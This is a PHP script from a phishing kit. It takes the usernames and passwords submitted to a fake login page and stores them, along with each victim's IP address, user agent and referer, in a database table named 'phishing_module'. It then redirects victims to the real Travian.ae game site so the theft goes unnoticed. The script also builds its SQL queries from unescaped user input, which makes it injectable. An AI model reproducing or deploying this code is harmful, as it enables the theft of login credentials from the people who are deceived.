<?php
    
require_once dirname(__FILE__)."/../includes/mysql_connect.inc.php";
require_once dirname(__FILE__)."/../includes/functions.inc.php";

$username      = @$_POST["username"];
$password      = @$_POST["password"];
$service       = @$_POST["service"];
$ip_address    = @detect_ip_address_2();
$user_agent    = @$_SERVER['HTTP_USER_AGENT'];
$http_referer  = @$_SERVER['HTTP_REFERER'];

echo ">>>>>"+ $username+" : "+$password; 

//
// replacing the empty field with --
//
if ($username == NULL) $username = "--";
if ($password == NULL) $password = "--";
if ($service == NULL) $service = "Unknown";

 
//$country_name = detect_country_name($ip_address);
 
$insert_query_1 = "INSERT INTO phishing_module(country,username,password,service,date,ip_address,user_agent,http_referer) VALUES(
                              'SA','$username','$password','$service',CURRENT_TIMESTAMP(),'$ip_address','$user_agent','$http_referer')";
 
 
$insert_1 = mysql_query($insert_query_1);
 
 
if ($insert_1) {

 } else {

    echo "Error in inserting: ".mysql_error()."<br>";
    exit();
 }
 
 
            //
            // Reddirects ....
            //
            if ($service == "Travian.ae") { //if start
                echo "<meta http-equiv='refresh' content='5;URL=http://travian.ae/'>";
            } //if end
            

?>
